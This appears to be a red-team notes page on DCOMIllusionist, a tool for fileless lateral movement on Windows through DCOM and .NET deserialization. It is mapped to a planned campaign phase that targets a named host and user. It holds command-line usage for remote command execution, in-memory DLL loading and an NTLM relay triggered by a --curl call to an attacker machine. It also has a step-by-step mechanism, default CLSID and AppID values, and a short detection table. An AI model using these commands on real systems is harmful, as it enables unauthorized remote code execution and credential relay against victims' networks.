# DCOMIllusionist — Fileless DCOM Lateral Movement

> **Source:** https://github.com/synacktiv/DCOMIllusionist
> **Author:** Synacktiv (Hugo Vincent)
> **Date:** 2026-06-11
> **MITRE:** T1021.003 (Distributed COM), T1055 (Process Injection)
> **CADRE mapping:** Campaign_suggestions.md #32, Phase 5

---

## What It Is

Fileless lateral movement via DCOM + .NET deserialization. .NET DCOM servers auto-deserialize incoming objects via `IManagedObject.GetSerializedBuffer`. Tool remotely modifies registry to associate .NET CLSID with AppID, forges DCOM OBJREFs, and triggers deserialization on target → code execution. No files written to disk.

## Prerequisites

- Admin privileges on both attacking and target machine
- Domain-joined attacking machine (for cross-session auth)
- Network access between target and attacker (or use `--listen` for relay via socat)

## Key Capabilities

| Flag | What It Does |
|------|-------------|
| `--exec <cmd>` | Arbitrary command execution |
| `--load-dll <path>` | In-memory DLL loading (fileless) |
| `--curl <url>` | HTTP request as victim user → NTLM relay |
| `--session N` | Cross-session execution |
| `--list-sessions` | Enumerate interactive sessions |
| `--fake-clsid` | Create fake CLSID for low-priv |
| `--hku` | Exploit from low-priv via HKU |
| `--yso-b64 <b64>` | ysoserial.net payload |

## Usage Examples

```powershell
# List sessions
DCOMIllusionist.exe -t 192.168.77.11 --list-sessions

# Execute command on target
DCOMIllusionist.exe -t 192.168.77.11 --exec whoami

# Cross-session execution (run as user in session 1)
DCOMIllusionist.exe -t 192.168.77.11 --session 1 --exec "cmd /c whoami"

# NTLM relay via cross-session curl
DCOMIllusionist.exe -t 192.168.77.11 --session 1 --curl http://kali.local

# In-memory DLL loading
DCOMIllusionist.exe -t 192.168.77.11 --load-dll payload.dll --dll-class Payload
```

## How It Works

1. Tool modifies registry remotely to create .NET CLSID + AppID association
2. Forges DCOM OBJREF using standard marshaller GUID
3. Target's .NET DCOM server receives object, queries `IManagedObject`
4. `GetSerializedBuffer` returns serialized .NET object
5. Target deserializes → arbitrary code execution
6. Cross-session: uses session moniker with AppID configured for Interactive User

## CADRE Application

- Phase 5 lateral movement from SYSTEM on mbr01
- Cross-session: execute as analyst_cloud in their session
- NTLM relay: trigger auth as victim user via `--curl`
- Fileless: no disk artifacts (unlike PsExec service creation)
- Enhances item #21 (Cross-Session Activation) — production-ready tool

## Detection

| Signal | Source |
|--------|--------|
| Process creation on target from DCOM | Sysmon EID 1 |
| Registry modification to CLSID/AppID | Sysmon EID 13 |
| Type 3 logon from attacker machine | WinSec 4624 |
| DCOM traffic (port 135 + dynamic port) | Network/Zeek |

## Default CLSIDs and AppIDs

| CLSID | Name |
|-------|------|
| BFFECCA7-4069-49F9-B5AB-7CCBB078ED91 | System.ServiceModel.Internal.TransactionBridge (default) |
| 2A7042D-578A-4366-9A3D-154C0498458E | System.Management.Instrumentation.ManagedCommonProvider |
| 37708080-3519-4ED6-91D5-A64B643863FB | Windows.Help.Runtime.CatalogRead |

| AppID | Name |
|-------|------|
| 577289B6-6E75-11DF-86F8-18A905160FE0 | Windows Push Notification (default) |
| 06C792F8-6212-4F39-BF70-E8C0AC965C23 | User Account Control Settings (Interactive User) |
| D4872B74-3AFC-47CD-B8A2-9E4F998539BC | Remote Cloud Store Factory (Interactive User) |

---

*Last updated: 2026-06-11*
